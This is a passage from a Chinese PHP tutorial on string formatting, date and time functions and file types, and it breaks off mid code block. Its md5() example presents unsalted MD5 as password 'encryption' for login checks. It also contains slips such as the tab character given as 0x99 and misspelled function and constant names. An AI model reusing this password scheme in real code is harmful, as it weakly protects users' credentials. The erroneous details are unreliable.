<tr>
<td>strtoupper()</td>
<td style="text-align:left">把字符串转化为大写</td>
</tr>
<tr>
<td>ucfirst()</td>
<td style="text-align:left">把字符串中的首字符转换为大写</td>
</tr>
<tr>
<td>ucwords()</td>
<td style="text-align:left">把字符串中每个单词的首字符转换为大写</td>
</tr>
<tr>
<td>nl2br()</td>
<td style="text-align:left">在字符串中的每行之间插入HTML换行符</td>
</tr>
<tr>
<td>htmlentities()</td>
<td style="text-align:left">把字符转化为HTML实体</td>
</tr>
<tr>
<td>htmlspecialchears()</td>
<td style="text-align:left">把一些预定义的字符转换为HTML实体</td>
</tr>
<tr>
<td>Stripslashes()</td>
<td style="text-align:left">删除由addcslashes()函数添加的反斜杠</td>
</tr>
<tr>
<td>strip_tags()</td>
<td style="text-align:left">剥去HTML、XML以及PHP的标签</td>
</tr>
<tr>
<td>number_format()</td>
<td style="text-align:left">通过千位分组来格式化数字</td>
</tr>
<tr>
<td>strrev()</td>
<td style="text-align:left">反转字符串</td>
</tr>
<tr>
<td>md5()</td>
<td style="text-align:left">将一个字符串进行MD5计算</td>
</tr>
</tbody>
</table>
<h3 id="取出空格和字符串填补函数"><a href="#取出空格和字符串填补函数" class="headerlink" title="取出空格和字符串填补函数"></a>取出空格和字符串填补函数</h3><p>在PHP中可以通过ltrim()、rtrim()和trim()函数利用处理字符串中多余的空格，或者一些其他没有意义的符号。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">string ltrim(string str[,string charlist])		//从字符串左侧删除空格或者其他预定义字符</div><div class="line">string rtrim(string str[,string charlist])		//从字符串右侧删除空白字符或其他预定义字符</div><div class="line">string trim(string str[,string charlist])		//从字符串的两端删除空白字符和其他预定义字符</div></pre></td></tr></table></figure></p>
<p>这三个函数分别用于从字符串的左、右和两端删除空白字符或其他预定义字符。处理后的结果都会以新字符串的形式返回，不会在原字符串上修改。其中第一个参数str是待处理的字符串，为必选项。第二个参数charlist是过滤字符串，用于指定希望去除的特殊符号，该参数为可选。如果不指定过滤字符串，默认情况下会去掉下列字符：</p>
<ul>
<li>“ ”：ASCII为32的字符（0x20），即空格</li>
<li>“\0”：ASCII为0的字符（0x00），即NULL</li>
<li>“\t”：ASCII为9的字符（0x99），即制表符</li>
<li>“\n”：ASCII为10的字符（0x0A），即新行</li>
<li>“\r”：ASCII为13的字符（0x0D），即回车</li>
</ul>
<p>此外还可以使用“..”符号指定需要取出的一个范围，例如“0..9”或“a..z”表示去掉ASCII码值中的数字和小写字母。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$str=&quot;   lamp  &quot;;  //声明一个字符串，其中左侧有3个空格，右侧2个空格，总长度为9个字符</div><div class="line">	echo strlen($str);            //输出字符串的总长度 9</div><div class="line">	echo strlen(ltrim($str));       //去掉左侧空格后的长度输出为 6</div><div class="line">	echo strlen(rtrim($str));       //去掉右侧空格后的长度输出为 7</div><div class="line">	echo strlen(trim($str));        //去掉两侧空格后的长度输出为 4</div><div class="line"></div><div class="line">	$str=&quot;123 This is a test ...&quot;;    //声明一个测试字符串，左侧为数字开头，右侧为省略号“…”</div><div class="line">	echo ltrim($str, &quot;0..9&quot;);       //过滤掉字符串左侧的数字，输出：This is a test ...</div><div class="line">	echo rtrim($str, &quot;.&quot;);         //过滤掉字符串右侧的所有“.”，输出：123 This is a test</div><div class="line">	echo trim($str, &quot;0..9 A..Z .&quot;);  //过滤掉字符串两端的数字和大写字母还有“.”，输出：his is a test</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>不仅可以按需求过滤字符串中的内容，还可以使用str_pad()函数按需求对字符串进行填补。可以用于对一些敏感信息的保护。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string str_pad(string input,int pad_length[,string pad_string[,int pad_type]])</div></pre></td></tr></table></figure></p>
<p>该函数有四个参数，第一个参数是必选项，指明要处理的字符串。第二个参数也是必选项，给丁处理后字符串的长度，如果该值小于原始字符串的长度，则不进行任何操作。第三个参数指定填补时所用的字符串，它为可选参数。如果没有指定则默认使用空格填补。最后一个参数指定填补的方向，它有三个可选值：STR_PAD_BOTH、STR_PAD_LEFT和STR_PAD_RIGHT，分别代表在字符串两端、左和右进行填补。也是一个可选参数，如果没有指定则默认值是STR_PAD_RIGHT。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$str= &quot;LAMP&quot;;                           </div><div class="line">	echo str_pad($str, 10);        //指定长度为10，默认使用空格在右边填补&quot;LAMP      &quot;</div><div class="line">	echo str_pad($str, 10, &quot;-=&quot;, STR_PAD_LEFT);  //指定长度为10，指定在左边填补&quot; -=-=-=LAMP&quot;</div><div class="line">	echo str_pad($str, 10, &quot;_&quot;, STR_PAD_BOTH);  //指定长度为10，指定两端填补 &quot; ___LAMP___&quot;</div><div class="line">	echo str_pad($str, 6 , &quot;___&quot;);                //指定长度为6， 默认在右边填补&quot; LAMP__&quot;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="字符串大小写转换"><a href="#字符串大小写转换" class="headerlink" title="字符串大小写转换"></a>字符串大小写转换</h3><p>在PHP中提供了四个字符串大小写的转换函数，它们都只有一个可选参数，即传入要进行转换的字符串。利用直接使用这些函数完成大小写转换的操作。函数strtoupper()用于将给定的字符串全部转换为大写字母；函数strtolower()用于将给定的字符串全部转换为小写字母；函数ucfirst()用于将给定的字符串中首字母转换为大写，其余字符不变；函数ucwords()用于将给定的字符串中全部以空格分隔的单词首字母转换为大写。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$lamp= &quot;lamp is composed of Linux、Apache、MySQL and PHP&quot;;</div><div class="line">	echo strtolower($lamp);  //输出lamp is composed of linux、apache、mysql and php </div><div class="line">	echo strtoupper($lamp);  //输出LAMP IS COMPOSED OF LINUX、APACHE、MYSQL AND PHP </div><div class="line">	echo ucfirst($lamp);     //输出Lamp is composed of Linux、Apache、MySQL and PHP</div><div class="line">	echo ucwords($lamp);   //输出Lamp Is Composed Of Linux、Apache、MySQL And PHP </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="和HTML标签相关的字符串格式化"><a href="#和HTML标签相关的字符串格式化" class="headerlink" title="和HTML标签相关的字符串格式化"></a>和HTML标签相关的字符串格式化</h3><h4 id="函数nl2br"><a href="#函数nl2br" class="headerlink" title="函数nl2br()"></a>函数nl2br()</h4><p>nl2br()函数是在字符串中的每个新行“\n”之前插入HTML换行符“<br>”。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	echo nl2br(&quot;One line.\nAnother line.&quot;);        //在“\n”前加上“&lt;br /&gt;”标记</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="函数htmlspecialchars"><a href="#函数htmlspecialchars" class="headerlink" title="函数htmlspecialchars()"></a>函数htmlspecialchars()</h3><p>htmlspecialchars()函数可以将一些预定义的字符转换为HTML实体。此函数用在预防使用者提供的文字中包含了HTML的标记。<br>以下是该函数可以转化的字符</p>
<ul>
<li>“&amp;”（和号）转换为“&amp;”。</li>
<li>“””（双引号）转换为“&quot;”。</li>
<li>“‘“(单引号)转换为“&#039;”。</li>
<li>“&lt;”（小于）转换为“&lt;”。</li>
<li>“&gt;”（小于）转换为“&gt;”。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string htmlspecialchars(string string[,int quote_style[,string charset]])</div></pre></td></tr></table></figure>
<p>该函数中第一个参数是带有HTML标记待处理的字符串，为必选参数。第二个参数为可选参数，用来决定引号的转换方式。默认值为ENT_COMPAT将只转换双引号，而保留单引号；NET_QUOTES将同时转换这两种引号；而RNT_NOQUOTES将不对引号进行转换。第三个参数也是可选的值，用于指定所处理字符串的字符集，默认的字符集是“ISO8859-1”.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">	&lt;body&gt;</div><div class="line">		&lt;?php</div><div class="line">			$str = &quot;&lt;B&gt;WebServer:&lt;/B&gt; &amp; &apos;Linux&apos; &amp; &apos;Apache&apos;&quot;; //常有HTML标记和单引号的字符串</div><div class="line">			echo htmlspecialchars($str, ENT_COMPAT);      //转换HTML标记和转换双引号</div><div class="line">			echo &quot;&lt;br&gt;\n&quot;;</div><div class="line">			echo htmlspecialchars($str, ENT_QUOTES);      //转换HTML标记和转换两种引号</div><div class="line">			echo &quot;&lt;br&gt;\n&quot;;</div><div class="line">			echo htmlspecialchars($str, ENT_NOQUOTES);   //转换HTML标记和不对引号转换</div><div class="line">		?&gt;</div><div class="line">	&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>在PHP中还提供了htmllentities()函数，可以将所有的非ASCII码字符转换为对应的实体代码。该函数与htmlspecialchars()函数的使用语法格式一致，但该函数可以转义更多的HTML字符。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$str = &quot;一个 &apos;quote&apos; 是 &lt;b&gt;bold&lt;/b&gt;&quot;;</div><div class="line"></div><div class="line">	// 输出: &amp;Ograve;&amp;raquo;&amp;cedil;&amp;ouml; &apos;quote&apos; &amp;Ecirc;&amp;Ccedil; &amp;lt;b&amp;gt;bold&amp;lt;/b&amp;gt;</div><div class="line">	echo htmlentities($str);</div><div class="line"></div><div class="line">	// 输出: 一个 &amp;#039;quote&amp;#039; 是 &amp;lt;b&amp;gt;bold&amp;lt;/b&amp;gt;</div><div class="line">	echo htmlentities($str, ENT_QUOTES,gb2312);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="其他字符串格式化函数"><a href="#其他字符串格式化函数" class="headerlink" title="其他字符串格式化函数"></a>其他字符串格式化函数</h3><h4 id="函数strrev"><a href="#函数strrev" class="headerlink" title="函数strrev()"></a>函数strrev()</h4><p>该函数的作用是将输入的字符反转，只提供一个要处理的字符串作为参数，返回反转后的字符串。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	echo strrev(&quot;you are sb&quot;);		//反转输出：bs era uoy </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="函数number-format"><a href="#函数number-format" class="headerlink" title="函数number_format()"></a>函数number_format()</h4><p>number_format()函数通过千位分组来格式化数字<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string number_format(float number[,int decimals[,string dec_point,string thousands_sep]])</div></pre></td></tr></table></figure></p>
<p>该函数返回格式化后的数组，该函数支持一个、两个或四个参数（不是三个）。第一个参数为必选项，提供要被格式化的数字。如果未设置其他参数，则数字会被格式化为不带小数点且以逗号（，）作为分隔符的数字。第二个参数是可选项，规定使用多少个小数位。如果设置了该参数，则使用点号（.）作为小数点来格式化数字。第三个参数也是可选的参数，规定用什么字符串作为小数点。第四个参数也为可选参数，规定用做千位分隔符的字符串。如果设置了该参数，那么所有其他参数都是必需的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$number=123456789;                   //声明一个数字</div><div class="line">	echo number_format($number);           //输出123,456,789千位分隔的字符串</div><div class="line">	echo number_format($number, 2);         //输出123,456,789.00小数点后保留两数小数 </div><div class="line">	echo number_format($number, 2, &quot;,&quot;, &quot;.&quot;);   //输出123.456.789,00 千位使用(,)分隔并保留两位小数</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="函数md5"><a href="#函数md5" class="headerlink" title="函数md5()"></a>函数md5()</h4><p>md5()函数的作用就是讲一个字符串进行MD5算法加密，默认返回一个32位的十六进制字符串。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string md5(string str[,bool raw_output])		//进行MD5算法加密演算</div></pre></td></tr></table></figure></p>
<p>其中第一个参数标识待处理的字符串，是必选项。第二个参数需要一个布尔型数值，是可选项。默认为FALSE，返回一个32位十六进制字符串。如果设置为TURE，将返回一个16位的二进制数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$password= &quot;lampbrother&quot;;          //定义一个字符串作为密码，加密后保存到数据库中</div><div class="line">	echo md5($password).&quot;&lt;br&gt;&quot;;       //输出MD5加密后的值：5f1ba7d4b4bf96fb8e7ae52fc6297aee</div><div class="line"></div><div class="line">	if (md5($password) == &apos;5f1ba7d4b4bf96fb8e7ae52fc6297aee&apos;) &#123;  //将输入的密码和数据库保存的匹配</div><div class="line">  		echo &quot;密码一致，登录成功&quot;;                         //如果相同则会输出这条信息</div><div class="line">  	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>在PHP中提供了一个对文件进行MD5加密的函数md5_file()，使用的方式和md5()函数相似。</p>
<h2 id="字符串比较函数"><a href="#字符串比较函数" class="headerlink" title="字符串比较函数"></a>字符串比较函数</h2><h3 id="按字节顺序进行字符串比较"><a href="#按字节顺序进行字符串比较" class="headerlink" title="按字节顺序进行字符串比较"></a>按字节顺序进行字符串比较</h3><p>按字节顺序进行字符串的比较可以使用strcmp()和strcasecmp()两个函数，其中函数strcasecmp()可以忽略字符串中字母的大小写进行比较。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">int strcmp(string str1,string str2)			//区分字符串中字母大小写地比较</div><div class="line">int strcasecmp(string str1,string str2)			//忽略字符串字母大小写地比较</div></pre></td></tr></table></figure></p>
<p>这两个函数的用法相似，都需要传入进行比较的两个字符串参数。可以对输入的str1和str2两字符串，按照字节的ASCII值从两个字符串的首字节开始比较，如果相等则进入下一个字节的比较，直至结束比较。返回以下三个值之一：</p>
<ul>
<li>如果str1等于str2则返回0</li>
<li>如果str1大于str2则返回1</li>
<li>如果str1小于str2则返回-1</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$userName=&quot;Admin&quot;;                     //声明一个字符串作为用户名</div><div class="line">	$password=&quot;lampBrother&quot;;                 //声明一个字符串作为密码</div><div class="line"></div><div class="line">	if(strcasecmp($userName, &quot;admin&quot;)==0) &#123;    //不区分大小写的比较，如果两个字符串相等返回0</div><div class="line">		echo &quot;用户名存在&quot;;</div><div class="line">	&#125;</div><div class="line">     	//将两个比较的字符串使用相应的函数转成全大写或全小写后，也可以实现不区分大小写的比较</div><div class="line">     	if(strcasecmp(strtolower($userName), strtolower(&quot;admin&quot;))==0) &#123;   </div><div class="line">		echo &quot;用户名存在&quot;;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	switch(strcmp($password, &quot;lampbrother&quot;))              //区分字符串中字母的大小写比较</div><div class="line">	&#123;</div><div class="line">		case 0:                                      //两个字符串相等则返回0</div><div class="line">			echo &quot;两个字符串相等&lt;br&gt;&quot;;</div><div class="line">			break;</div><div class="line">		case 1:                                      //第一个字符串大时则返回1</div><div class="line">			echo &quot;第一个字符串大于第二个字符串&lt;br&gt;&quot;;</div><div class="line">			break;</div><div class="line">		case -1:                                      //第一个字符串小时则返回-1</div><div class="line">			echo &quot;第一个字符串小于第二个字符串&lt;br&gt;&quot;;</div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h3 id="按自然排序进行字符串比较"><a href="#按自然排序进行字符串比较" class="headerlink" title="按自然排序进行字符串比较"></a>按自然排序进行字符串比较</h3><p>strnatcmp()函数按自然排序法比较两个字符串，该函数对大小写敏感，其使用格式与strcmp()函数相似。<br>在PHP中也提供了忽略大小写版本的函数strnatcasecmp()，用法和strnatcmp()函数相同。</p>
<h2 id="正则表达式在字符串处理中的应用"><a href="#正则表达式在字符串处理中的应用" class="headerlink" title="正则表达式在字符串处理中的应用"></a>正则表达式在字符串处理中的应用</h2><h2 id="与Perl兼容的正则表达式函数"><a href="#与Perl兼容的正则表达式函数" class="headerlink" title="与Perl兼容的正则表达式函数"></a>与Perl兼容的正则表达式函数</h2><h1 id="PHP常用功能模块"><a href="#PHP常用功能模块" class="headerlink" title="PHP常用功能模块"></a>PHP常用功能模块</h1><h2 id="日期和时间"><a href="#日期和时间" class="headerlink" title="日期和时间"></a>日期和时间</h2><h3 id="UNIX时间戳"><a href="#UNIX时间戳" class="headerlink" title="UNIX时间戳"></a>UNIX时间戳</h3><p>UNIX时间戳是保存日期和时间的一种紧凑简洁的方法，是大多数UNIX系统中保存当前日期和事件的一种方法，也是在大多数计算机语言标识日期和时间的一种标准格式。以32位的整数标识格林威治标准时间，例如整数11230499325表示当前事件的时间戳。UNIX时间戳是从1970年1月1日零点开始起到当前事件所经过的秒数。1970年1月1日零点作为所有日期计算的基础，这个日期通常称为UNIX纪元。</p>
<h4 id="将日期和时间转变成UNIX时间戳"><a href="#将日期和时间转变成UNIX时间戳" class="headerlink" title="将日期和时间转变成UNIX时间戳"></a>将日期和时间转变成UNIX时间戳</h4><p>在PHP中，如果需要将日期和事件转变成UNIX时间戳，可以调用mktime()函数。该函数的原型如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int mktime([int hour[,int minute[,int second[,int month[,int day[,int year]]]]]])</div></pre></td></tr></table></figure></p>
<p>该函数中所有参数都是可选的，如果参数为空，默认将当前时间转变成UNIX时间戳。这样，和直接调用time()函数获取当前的UNIX时间戳功能相同。参数也可以从右向左省略，任何省略的参数会被设置成本地日期和事件的当前值。如果只想转变日期，对具体的时间不在乎，可以将前三个转变事件的参数都设置为0.mktime()函数对于日期运算和验证非常有用，它可以自动校正越界的输入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	echo date(&quot;M-d-Y&quot;, mktime(0, 0, 0, 12, 36, 2007)).&quot;\n&quot;;  //日期超过31天，计算后输出Jan-05-2008</div><div class="line">	echo date(&quot;M-d-Y&quot;, mktime(0, 0, 0, 14, 1, 2008)).&quot;\n&quot;;   //月份超过12月，计算后输出Feb-01-2009</div><div class="line">	echo date(&quot;M-d-Y&quot;, mktime(0, 0, 0, 1, 1, 2009)).&quot;\n&quot;;    //没有问题的转变，输出结果 Jan-01-2009</div><div class="line">	echo date(&quot;M-d-Y&quot;, mktime(0, 0, 0, 1, 1, 99)).&quot;\n&quot;;      //会将99年转变为1999年， Jan-01-1999</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h4 id="日期计算"><a href="#日期计算" class="headerlink" title="日期计算"></a>日期计算</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"> 	$year = 1981;                                 //从表单中接收用户提交的出生日期中的年份</div><div class="line"> 	$month = 11;                                 //从表单中接收用户提交的出生日期中的月份</div><div class="line"> 	$day = 05;                                   //从表单中接收用户提交的出生日期中的天</div><div class="line">	$birthday = mktime (0, 0, 0, $month, $day, $year);   //将出生日期转变为UNIX时间戳</div><div class="line">	$nowdate = time();                            //调用time()函数获取当前时间的UNIX时间戳</div><div class="line">	$ageunix = $nowdate - $birthday;                //两个时间戳相减获取用户年龄的UNIX时间戳</div><div class="line">	$age = floor($ageunix / (60*60*24*365));         //将UNIX时间戳除以一年的秒数获取用户年龄</div><div class="line">	echo &quot;年龄：$age&quot;;                           //输出用户的年龄，根据计算得到结果27</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>在以上脚本中，调用mktime()函数将从用户出生日期转变为UNIX时间戳，再调用time()函数获取当前事件的UNIX时间戳。因为这个日期的格式都是使用整数表示的，所以可以将它们相减。又将计算后获取的UNIX时间戳除以一年的秒数，将UNIX时间戳转变为以年度量的单位。</p>
<h3 id="在PHP中获取日期和时间"><a href="#在PHP中获取日期和时间" class="headerlink" title="在PHP中获取日期和时间"></a>在PHP中获取日期和时间</h3><p>PHP中提供了多种获取事件和日期的函数，除了通过time()函数获取当前的UNIX时间戳外，调用getdate()函数确定当前时间，通过gettimeofday()函数获取某一天中的具体时间。此外，在PHP中还可以通过date_sunrise()和date_sunset()两个函数，获取某地点某天的日出时间和日落时间。</p>
<h3 id="日期和时间格式化输出"><a href="#日期和时间格式化输出" class="headerlink" title="日期和时间格式化输出"></a>日期和时间格式化输出</h3><p>在PHP中可以调用date()函数格式化一个本地事件和日期，该函数的原型如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string date(string format[,int timestamp])   		//格式化一个本地时间和日期</div></pre></td></tr></table></figure></p>
<p>该函数有两个参数，第一个参数是必需的，规定时间戳的转换格式。第二个参数是可选的，需要提供一个UNIX时间戳，如果没有指定这个时间戳，默认值为time()将返回当前的日期和时间。该函数返回一个格式化后表示适当日期的字符串。date()函数的常见调用方式如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo date(&quot;Y-m-d H:i:s&quot;);			//输出当前的时间格式：xxxx-xx-xx xx:xx:xx</div></pre></td></tr></table></figure></p>
<h1 id="文件系统处理"><a href="#文件系统处理" class="headerlink" title="文件系统处理"></a>文件系统处理</h1><h2 id="文件系统概述"><a href="#文件系统概述" class="headerlink" title="文件系统概述"></a>文件系统概述</h2><h3 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h3><p>PHP是以UNIX的文件系统为模型的，因此在Windows系统中我们只能获得“file”、“dir”或者“unknown”三种文件类型。而在UNIX系统中，我们可以获得“block”、“char”、“dir”、“fifo”、“file”、“link”和“unknown”七种类型。</p>
<table>
<thead>
<tr>
<th>文件类型</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>block</td>
<td style="text-align:left">块设备文件，如某个磁盘分区、软驱、光驱CD-ROM等</td>
</tr>
<tr>
<td>char</td>
<td style="text-align:left">字符设备是指在I/O传输过程中以字符为单位进行传输的设备，例如键盘，打印机等</td>
</tr>
<tr>
<td>dir</td>
<td style="text-align:left">目录类型，目录也是文件的一种</td>
</tr>
<tr>
<td>fifo</td>
<td style="text-align:left">命名管道，常用与将信息从一个进程传递到另一个进程</td>
</tr>
<tr>
<td>file</td>
<td style="text-align:left">普通文件类型，如文本文件或可执行文件等</td>
</tr>
<tr>
<td>link</td>
<td style="text-align:left">符号链接，是指向文件指针的指针，类似Windows中的快捷键</td>
</tr>
<tr>
<td>unkonwn</td>
<td style="text-align:left">未知类型</td>
</tr>
</tbody>
</table>
<p>在PHP中可以使用filetype()函数获取文件的上述类型，该函数接受一个文件名作为参数，如果文件不存在将返回FALSE。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	//获取Linux系统下文件类型</div><div class="line">	echo filetype(&apos;/etc/passwd&apos;);      //输出file，/etc/passwd为普通文件</div><div class="line">	echo filetype(&apos;/etc/grub.conf&apos;);    //输出link，/etc/grub.conf为链接文件，链接到/boot/grub/grub.conf</div><div class="line">	echo filetype(&apos;/etc/&apos;);            //输出dir，/etc/为一个目录，即文件夹</div><div class="line">	echo filetype(&apos;/dev/sda1&apos;);        //输出block，/dev/sda1为块设备，它是一个分区</div><div class="line">	echo filetype(&apos;/dev/tty01&apos;);       //输出char，为字符设备，它是一个字符终端</div><div class="line"></div><div class="line">	//获取Windows系统下文件类型</div><div class="line">	echo filetype(&quot;C:\\WINDOWS\\php.ini&quot;);     //输出file，C:\WINDOWS\php.ini为一个普通文件</div><div class="line">	echo filetype(&quot;C:\\WINDOWS&quot;);            //输出dir，C:\WINDOWS为一个文件夹（目录）</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>对于一个已知的文件，还可以使用is_file()函数判断给定的文件名是否为一个正常的文件。和它类似的，使用is_dir()函数判断给定的文件名是否是一个目录，使用is_link()函数判断给定的文件名是否为一个符号链接。</p>
<h3 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h3><p>PHP中提供用来获取文件的一些常见属性的内置函数。</p>
<table>
<thead>
<tr>
<th>函数名</th>
<th style="text-align:left">作用</th>
<th>参数</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>file_exists()</td>
<td style="text-align:left">检查文件或目录是否存在</td>
<td>文件名</td>
<td style="text-align:left">文件存在返回TRUE，不存在则返回FALSE</td>
</tr>
<tr>
<td>filesize()</td>
<td style="text-align:left">取得文件大小</td>
<td>文件名</td>
<td style="text-align:left">返回文件大小的字节数，出错返回FALSE</td>
</tr>
<tr>
<td>is_readable()</td>
<td style="text-align:left">判断给定文件名是否可读</td>
<td>文件名</td>
<td style="text-align:left">如果文件存在且可读则返回TRUE</td>
</tr>
<tr>
<td>is_writable()</td>
<td style="text-align:left">判断给定文件名是否可写</td>
<td>文件名</td>
<td style="text-align:left">如果文件存在且可写则返回TRUE</td>
</tr>
<tr>
<td>is_executable()</td>
<td style="text-align:left">判断给定文件名是否可执行</td>
<td>文件名</td>
<td style="text-align:left">如果文件存在且可执行则返回TRUE</td>
</tr>
<tr>
<td>filectime()</td>
<td style="text-align:left">获取文件的创建时间</td>
<td>文件名</td>
<td style="text-align:left">返回UNIX时间戳格式</td>
</tr>
<tr>
<td>filemtime()</td>
<td style="text-align:left">获取文件的修改时间</td>
<td>文件名</td>
<td style="text-align:left">返回UNIX时间戳格式</td>
</tr>
<tr>
<td>fileatime()</td>
<td style="text-align:left">获取文件的访问时间</td>
<td>文件名</td>
<td style="text-align:left">返回UNIX时间戳格式</td>
</tr>
<tr>
<td>stat()</td>
<td style="text-align:left">获取文件大部分属性值</td>
<td>文件名</td>
<td style="text-align:left">返回关于给定文件有用信息的数组</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div 